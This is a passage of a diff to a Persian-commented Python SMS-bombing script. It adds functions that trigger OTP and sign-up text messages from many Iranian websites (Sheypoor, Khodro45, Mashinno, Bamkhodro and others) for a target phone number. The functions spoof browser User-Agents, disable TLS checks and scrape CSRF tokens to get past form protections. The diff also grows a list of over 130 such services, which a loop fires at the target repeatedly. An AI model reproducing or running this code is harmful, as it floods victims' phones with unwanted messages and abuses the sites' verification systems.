+        "Referer": "https://www.sheypoor.com/",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
+    }
+    
+    data = {
+        "username": normalized_phone
+    }
+    
+    try:
+        response = requests.post(
+            url=url,
+            json=data,
+            headers=headers,
+            timeout=15,
+            verify=False
+        )
+        
+        # چاپ پاسخ برای دیباگ
+        print(f"{y}[Sheypoor] Status: {response.status_code}, Response: {response.text}{a}")
+        
+        if response.status_code in [200, 201, 202]:
+            print(f"{g}[Sheypoor] کد تأیید ارسال شد{a}")
+            return True
+        elif response.status_code == 429:
+            print(f"{y}[Sheypoor] محدودیت ارسال (Too Many Requests){a}")
+            return False
+        else:
+            print(f"{y}[Sheypoor] خطا با کد وضعیت: {response.status_code}{a}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[Sheypoor] خطای ارتباطی: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[Sheypoor] خطای ناشناخته: {e}{a}")
+        return False
+        
+def khodro45(phone):
+    """
+    تابع برای ارسال کد تأیید به API خودرو45
+    """
+    url = "https://khodro45.com/api/v2/customers/otp/"
+    
+    # تبدیل +98912... به 0912...
+    normalized_phone = phone.replace("+98", "0")
+    
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "accept-ranges": "bytes",
+        "access-control-allow-headers": "Authorization,Accept,Origin,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Content-Range,Range",
+        "access-control-allow-origin": "*",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(90, 120)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)} Safari/537.36",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    
+    data = {
+        "mobile": normalized_phone,
+        "device_type": 2
+    }
+    
+    try:
+        response = requests.post(
+            url=url,
+            json=data,
+            headers=headers,
+            timeout=15,
+            verify=False
+        )
+        
+        # چاپ پاسخ برای دیباگ
+        print(f"{y}[Khodro45] Status: {response.status_code}, Response: {response.text}{a}")
+        
+        if response.status_code in [200, 201, 202]:
+            print(f"{g}[Khodro45] کد تأیید ارسال شد{a}")
+            return True
+        elif response.status_code == 429:
+            print(f"{y}[Khodro45] محدودیت ارسال (Too Many Requests){a}")
+            return False
+        else:
+            print(f"{y}[Khodro45] خطا با کد وضعیت: {response.status_code}{a}")
+            return False
+            
+    except requests.exceptions.RequestException as e:
+        print(f"{r}[Khodro45] خطای ارتباطی: {e}{a}")
+        return False
+    except Exception as e:
+        print(f"{r}[Khodro45] خطای ناشناخته: {e}{a}")
+        return False
+        
+def cita(phone):
+    try:
+        # پاکسازی شماره
+        clean_phone = phone.replace(" ", "").replace("+", "")
+        if clean_phone.startswith("98"):
+            clean_phone = "0" + clean_phone[2:]
+        elif not clean_phone.startswith("0"):
+            clean_phone = "0" + clean_phone
+
+        url = f"https://api.cita.ir/auth/tsv/generate?username={clean_phone}"
+        headers = {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Authorization": "Basic Y2xpZW50QXBwSWQ6dGVzdA==",
+            "Accept-Language": "fa",
+            "Accept": "application/json, text/plain, */*",
+            "Cache-Control": "max-age=31536000"
+        }
+
+        response = requests.post(url, data={}, headers=headers, timeout=10)
+        print(f"[DEBUG] Status: {response.status_code}")
+        try:
+            data = response.json()
+            print(f"[DEBUG] Response: {data}")
+        except ValueError:
+            print(f"[DEBUG] Response is not JSON: {response.text}")
+            return False
+
+        if response.status_code == 200:
+            print("[+] Cita: OTP ارسال شد ✅")
+            return True
+        else:
+            print(f"[-] Cita: خطا در ارسال ({response.status_code})")
+            return False
+
+    except Exception as e:
+        print(f"[!] Cita Exception: {e}")
+        return False
+        
+        
+
+def ticketchi(phone: str):
+    url = "https://www.ticketchi.ir/api/collect"
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/plain, */*",
+    }
+    payload = {"plaintext": phone}
+
+    try:
+        resp = requests.post(url, json=payload, headers=headers)
+        if resp.status_code == 200:
+            print("[+] Ticketchi: OTP درخواست شد ✅")
+            try:
+                data = resp.json()
+                print("[DEBUG] Response:", data)
+            except:
+                print("[DEBUG] Response is not JSON:", resp.text)
+            return True
+        else:
+            print(f"[-] Ticketchi: خطا در ارسال ({resp.status_code})")
+            print("[DEBUG] Response:", resp.text)
+            return False
+    except Exception as e:
+        print("[-] Ticketchi: خطا در اتصال یا ارسال:", e)
+        return False
+        
+        
+def mashinno(phone):
+    """
+    تابع برای ارسال کد تأیید به Mashinno
+    """
+    url = "https://mashinno.com/x-api/main/v1/auth/send-code"
+
+    # تبدیل +98 به 0
+    normalized_phone = phone.replace("+98", "0")
+
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                      f"(KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}."
+                      f"{random.randint(100,999)} Safari/537.36"
+    }
+
+    data = {"mobile": normalized_phone}
+
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)
+
+        print(f"[Mashinno] Status: {response.status_code}, Response: {response.text}")
+
+        if response.status_code in [200, 201, 202]:
+            print("✅ [Mashinno] کد تأیید ارسال شد")
+            return True
+        elif response.status_code == 429:
+            print("⚠️ [Mashinno] محدودیت ارسال (Too Many Requests)")
+            return False
+        else:
+            print(f"❌ [Mashinno] خطا با کد وضعیت: {response.status_code}")
+            return False
+
+    except requests.exceptions.RequestException as e:
+        print(f"❌ [Mashinno] خطای ارتباطی: {e}")
+        return False
+    except Exception as e:
+        print(f"❌ [Mashinno] خطای ناشناخته: {e}")
+        return 
+        
+def automoby(phone):
+    """
+    تابع برای ارسال کد تأیید به Automoby
+    """
+    url = "https://api.automoby.ir/api/user/login"
+
+    # تبدیل +98 به 0
+    normalized_phone = phone.replace("+98", "0")
+
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://automoby.ir",
+        "Referer": "https://automoby.ir/",
+        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                      f"(KHTML, like Gecko) Chrome/{random.randint(90,120)}.0.{random.randint(1000,9999)}."
+                      f"{random.randint(100,999)} Safari/537.36"
+    }
+
+    data = {"phoneNumber": normalized_phone}
+
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=15, verify=False)
+
+        print(f"[Automoby] Status: {response.status_code}, Response: {response.text}")
+
+        if response.status_code in [200, 201, 202]:
+            print("✅ [Automoby] کد تأیید ارسال شد")
+            return True
+        elif response.status_code == 429:
+            print("⚠️ [Automoby] محدودیت ارسال (Too Many Requests)")
+            return False
+        else:
+            print(f"❌ [Automoby] خطا با کد وضعیت: {response.status_code}")
+            return False
+
+    except requests.exceptions.RequestException as e:
+        print(f"❌ [Automoby] خطای ارتباطی: {e}")
+        return False
+    except Exception as e:
+        print(f"❌ [Automoby] خطای ناشناخته: {e}")
+        return False
+        
+        
+def mryadaki(phone):
+    # تبدیل شماره به 09...
+    if phone.startswith("+98"):
+        normalized_phone = "0" + phone[3:]
+    elif phone.startswith("98"):
+        normalized_phone = "0" + phone[2:]
+    else:
+        normalized_phone = phone
+
+    session = requests.Session()
+    url_login = "https://www.mryadaki.com/auth/login-otp?ReturnUrl=%2Fprofile%2F"
+
+    try:
+        # دریافت صفحه ورود
+        resp = session.get(url_login, timeout=10)
+        soup = BeautifulSoup(resp.text, "html.parser")
+
+        # پیدا کردن توکن
+        token_input = soup.find("input", {"name": "__RequestVerificationToken"})
+        if not token_input:
+            print("❌ [MrYadaki] خطا: نتونستم توکن پیدا کنم")
+            return
+
+        token = token_input.get("value", "")
+        if not token:
+            print("❌ [MrYadaki] خطا: مقدار توکن خالیه")
+            return
+
+        # ارسال شماره
+        data = {
+            "UserName": normalized_phone,
+            "__RequestVerificationToken": token,
+            "ReturnUrl": ""
+        }
+        headers = {"X-Requested-With": "XMLHttpRequest"}
+
+        resp2 = session.post(url_login, data=data, headers=headers, timeout=10)
+
+        if resp2.status_code == 200:
+            print(f"✅ [MrYadaki] کد تأیید ارسال شد به شماره {normalized_phone}")
+        else:
+            print(f"❌ [MrYadaki] خطا: Status {resp2.status_code}")
+
+    except Exception as e:
+        print(f"❌ [MrYadaki] Exception: {e}")
+        
+        
+        
+def bamkhodro(phone, email="test@example.com", password="Test1234!@#"):
+    """
+    ارسال کد OTP به BamKhodro به صورت اتوماتیک
+    """
+    session = requests.Session()
+    base_url = "https://shop.bamkhodro.ir/"
+
+    # گرفتن صفحه اصلی برای استخراج instance_id و digits_form
+    resp = session.get(base_url)
+    if resp.status_code != 200:
+        print("❌ نتونستم صفحه اصلی رو باز کنم")
+        return False
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    
+    # استخراج instance_id و digits_form
+    instance_tag = soup.find("input", {"name": "instance_id"})
+    form_tag = soup.find("input", {"name": "digits_form"})
+    referer_tag = soup.find("input", {"name": "_wp_http_referer"})
+
+    if not instance_tag or not form_tag or not referer_tag:
+        print("❌ نتونستم instance_id یا form_id یا _wp_http_referer رو پیدا کنم")
+        return False
+
+    instance_id = instance_tag.get("value")
+    digits_form = form_tag.get("value")
+    wp_referer = referer_tag.get("value")
+
+    # آماده سازی داده برای ارسال OTP
+    payload = {
+        "digt_countrycode": "+98",
+        "phone": phone.replace("+98", "0"),
+        "email": email,
+        "digits_reg_password": password,
+        "digits_process_register": "1",
+        "sms_otp": "",
+        "otp_step_1": "1",
+        "digits_otp_field": "1",
+        "instance_id": instance_id,
+        "optional_data": "optional_data",
+        "action": "digits_forms_ajax",
+        "type": "register",
+        "dig_otp": "otp",
+        "digits": "1",
+        "digits_redirect_page": f"{base_url}my-account/",
+        "g-recaptcha-response": "",
+        "digits_form": digits_form,
+        "_wp_http_referer": wp_referer,
+        "container": "digits_protected",
+        "sub_action": "sms_otp"
+    }
+
+    headers = {
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept": "*/*",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+    }
+
+    try:
+        otp_resp = session.post(f"{base_url}wp-admin/admin-ajax.php", data=payload, headers=headers, timeout=15)
+        if otp_resp.status_code == 200 and '"success":true' in otp_resp.text:
+            print(f"✅ [BamKhodro] کد تأیید ارسال شد به شماره {phone}")
+            return True
+        else:
+            print(f"❌ [BamKhodro] خطا یا محدودیت ارسال: {otp_resp.text}")
+            return False
+    except Exception as e:
+        print(f"❌ [BamKhodro] خطای ارتباطی: {e}")
+        return False
+        
+        
+        
+def shojapart(phone):
+    """
+    ارسال کد تأیید به شماره داده شده در shojapart.com
+    فقط شماره ورودی لازم است.
+    """
+    url = "https://shojapart.com/wp-admin/admin-ajax.php"
+
+    data = {
+        "first_name": "کاربر",
+        "last_name": "تست",
+        "user_email": "",
+        "phone_number": phone,
+        "wupp_remember_me": "on",
+        "action": "wupp_sign_up"
+    }
+
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "*/*",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+
+    try:
+        response = requests.post(url, data=data, headers=headers, timeout=15)
+
+        if response.status_code == 200:
+            print(f"[Shojapart] درخواست ارسال شد به شماره {phone}")
+            print("پاسخ سرور:", response.text)
+            return True
+        else:
+            print(f"[Shojapart] خطا در ارسال (کد وضعیت: {response.status_code})")
+            return False
+
+    except requests.exceptions.RequestException as e:
+        print(f"[Shojapart] خطای ارتباطی: {e}")
+        return False
+        
+        
+
+def proparts(phone_number):
+    """
+    ارسال درخواست OTP به شماره مشخص شده برای سایت proparts.ir
+    ورودی:
+        phone_number: شماره موبایل به فرمت 09123456789
+    خروجی:
+        پاسخ JSON سرور
+    """
+    url = "https://proparts.ir/wp-admin/admin-ajax.php"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    data = {
+        "action": "logini_first",
+        "login": phone_number
+    }
+
+    response = requests.post(url, headers=headers, data=data)
+    try:
+        return response.json()  # پاسخ سرور را به صورت JSON برمی‌گرداند
+    except:
+        return response.text  # اگر JSON نبود، متن خام را برمی‌گرداند
+
+        
+
+def bazari(phone, firstname="محمد", lastname="احمدی"):
+    """
+    شماره موبایل را به فرمت 09123456789 تبدیل و SMS ثبت‌نام در bazari ارسال می‌کند.
+    """
+    # فرمت کردن شماره
+    phone = phone.strip()
+    if phone.startswith("+98"):
+        phone = "0" + phone[3:]
+    elif phone.startswith("98") and len(phone) == 12:
+        phone = "0" + phone[2:]
+
+    url = "https://bazari.org/login?back=my-account"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest",
+        "Accept": "*/*"
+    }
+    data = {
+        "username": phone,
+        "id_customer": "",
+        "back": "",
+        "firstname": firstname,
+        "lastname": lastname,
+        "action": "register",
+        "ajax": 1
+    }
+
+    try:
+        res = requests.post(url, headers=headers, data=data, timeout=10)
+        if res.status_code == 200:
+            try:
+                return res.json()  # خروجی JSON سرور
+            except:
+                return res.text  # اگر JSON نبود متن خام
+        else:
+            return f"خطا: Status Code {res.status_code}"
+    except Exception as e:
+        return f"خطا: {e}"
+
+
+def farshonline(phone):
+    # حذف فاصله و خطاهای احتمالی
+    phone = phone.strip().replace(" ", "")
+    
+    # اگر با +98 شروع شد، به 0 تبدیل کن
+    if phone.startswith("+98"):
+        phone = "0" + phone[3:]
+    
+    # اگر با 98 شروع شد و + نداره، به 0 تبدیل کن
+    elif phone.startswith("98"):
+        phone = "0" + phone[2:]
+    
+    url = "https://farshonline.com/ajax.php"
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Requested-With": "XMLHttpRequest"
+    }
+    data = {
+        "register": 1,
+        "mobile": phone
+    }
+    
+    res = requests.post(url, headers=headers, data=data)
+    try:
+        return res.text
+    except:
+        return res.status_code
+
+
+
+def amirkabircarpet(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج CSRF token
+        home_url = "https://amirkabircarpet.ir/bakala/"
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        }
+        
+        response = session.get(home_url, headers=headers, timeout=10, verify=False)
+        html = response.text
+        
+        # استخراج CSRF token با BeautifulSoup
+        soup = BeautifulSoup(html, 'html.parser')
+        csrf_token = None
+        
+        # جستجو در meta tags
+        meta_token = soup.find('meta', {'name': 'csrf-token'})
+        if meta_token:
+            csrf_token = meta_token.get('content')
+        
+        # جستجو در input fields
+        if not csrf_token:
+            input_token = soup.find('input', {'name': '_token'})
+            if input_token:
+                csrf_token = input_token.get('value')
+        
+        if not csrf_token:
+            print(f"{r}[-] CSRF token پیدا نشد{a}")
+            return False
+            
+        print(f"{g}[+] CSRF token: {csrf_token}{a}")
+
+        # ارسال درخواست
+        url = "https://amirkabircarpet.ir/bakala/ajax/send_code/"
+        data = {
+            'action': 'bakala_send_code',
+            'phone_email': phone.replace('+98', '0')
+        }
+        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'X-CSRF-TOKEN': csrf_token,
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://amirkabircarpet.ir',
+            'Referer': home_url,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        }
+
+        response = session.post(url, data=data, headers=headers, timeout=10, verify=False)
+        
+        print(f"Status Code: {response.status_code}")
+        print(f"Response: {response.text}")
+        
+        if response.status_code == 200:
+            try:
+                result = response.json()
+                if result.get("status") == "success":
+                    print(f"{g}[+] کد ارسال شد!{a}")
+                    return True
+            except:
+                if 'success' in response.text.lower():
+                    print(f"{g}[+] کد ارسال شد!{a}")
+                    return True
+        return False
+            
+    except Exception as e:
+        print(f"{r}[!] خطا: {e}{a}")
+        return False  
+        
+        
+        
+def modema(phone, name="نام و نام خانوادگی"):
+    # تبدیل شماره به فرمت 091xxxxxxx
+    phone = phone.strip()
+    if phone.startswith("+98"):
+        phone = "0" + phone[3:]
+    elif phone.startswith("98"):
+        phone = "0" + phone[2:]
+    elif phone.startswith("9") and len(phone) == 10:
+        phone = "0" + phone
+
+    url = "https://panel.modema.com/api/register-otp"
+    headers = {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json"
+    }
+    data = {
+        "phone": phone,
+        "name": name,
+        "enterName": True
+    }
+
+    try:
+        response = requests.post(url, json=data, headers=headers, timeout=10)
+        if response.status_code == 200:
+            print(f"[+] درخواست ارسال شد به {phone}")
+            print(f"Response: {response.text}")
+            return True
+        else:
+            print(f"[-] خطا در ارسال: Status Code {response.status_code}")
+            print(f"Response: {response.text}")
+            return False
+    except Exception as e:
+        print(f"[!] خطا: {e}")
+        return False
+        
+        
+def roozima(phone):
+    url = "https://roozima.ir/api/site/v1/customer/login/?language=fa"
+    headers = {
+        "Content-Type": "application/json",
+        "Accept": "application/json",
+        "Authorization": "Bearer undefined",
+        "User-Agent": "Mozilla/5.0"
+    }
+    payload = {"mobile": phone, "password": "", "loginType": 1}
+
+    try:
+        r = requests.post(url, headers=headers, json=payload, timeout=10)
+        if r.status_code == 200 and (r.json().get("success") or r.json().get("data", {}).get("otp_sent")):
+            print(f"[+] کد ارسال شد به {phone}")
+            return True
+        print(f"[-] خطا در ارسال: {r.text}")
+        return False
+    except Exception as e:
+        print(f"[!] خطا: {e}")
+        return False
+
+
 def activecleaners(phone):
     try:
         # پاکسازی شماره
@@ -4340,17 +5920,20 @@ def iranhotel(phone):
 # ==========================
 
 services = [
-    abantether, accounts1606, achareh, abanapps, activecleaners, alibaba, alldigitall, alopeyk_safir, angeliran, arzplus,
-    arzunex, azkivam, azno, Balad, banimode, barghapp, barghman, Besparto, bimebazar, bit24,
-    bitpin, bodoroj, booking, candom_shop, Charsooq, charter118, cita, coinkade, dastakht, denj,
-    denro, dgshahr, digikala, DigikalaJet, divar, drnext, drto, elanza, fadaktrains, gap,
-    gapfilm, ghasedak24, gruccia, hajamooo, harikashop, hotelyar, ilozi, iranhotel, instagram_send, katonikhan,
-    katoonistore, komodaa, Koohshid, mahabadperfume, malltina, masterkala, mek, milli_gold, missomister, mo7_ir,
-    mobilex, mootanroo, mrbilit, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak, ompfinex,
-    paklean_call, payaneh, payonshoes, pindo, pinket, ragham_call, raastin, riiha, Sandalestan, ShahreSandal,
-    shahrfarsh, safarbazi, sarmayex, sibapp, sibbank, smarket, snapp, snappshop, tabdeal, tapsi,
-    tapsi_food, tebinja, telegram_send, tetherland, theshoes, torobpay, trip, trip_call, technogold, twox,
-    ubitex, vakiljo, virgool, vitrin_shop, washino
+    abantether, accounts1606, achareh, abanapps, abzarmarket, activecleaners, alibaba, alldigitall, alopeyk_safir, amirkabircarpet,
+    angeliran, aryakalaabzar, arzplus, arzunex, automoby, azkivam, azno, Balad, baldano, bamkhodro,
+    banimode, barghapp, barghman, bazari, Besparto, bimebazar, bit24, bitpin, bodoroj, booking,
+    bornosmode, candom_shop, cartesabz, Charsooq, charter118, chapmatin, coinkade, dastakht, denj, denro,
+    dgshahr, digikala, DigikalaJet, divar, drnext, drto, eavar, eghamat24, ekeepa, elanza,
+    fadaktrains, farshonline, gap, gapfilm, ghasedak24, gruccia, hajamooo, harikashop, hotelyar, ilozi,
+    iranhotel, irankohan, instagram_send, karnameh, katonikhan, katoonistore, khodro45, komodaa, Koohshid, mahabadperfume,
+    malltina, mashinno, masterkala, mek, milli_gold, missomister, mo7_ir, mobilex, modema, mohrpegah,
+    mootanroo, mrbilit, mryadaki, mydigipay, nikpardakht, niktakala, Okala, okorosh, otaghak, ompfinex,
+    padmira, paklean_call, payaneh, payonshoes, pindo, pinket, proparts, ragham_call, raastin, raheeno,
+    riiha, roozima, safarbazi, Sandalestan, sarmayex, ShahreSandal, shahrfarsh, sheypoor, shojapart, sibapp,
+    sibbank, smarket, snapp, snappshop, t4f, tabdeal, tapsi, tapsi_food, teamgraphic, tebinja,
+    telegram_send, tetherland, theshoes, three_click, ticketchi, technogold, toorangco, torobpay, trip, trip_call,
+    twox, ubitex, vakiljo, virgool, vitrin_shop, washino, xmohr
 ]
 
 
@@ -4405,3 +5988,4 @@ if __name__ == "__main__":
         except ValueError:
             delay = 0.1
         vip(phones, delay)
+
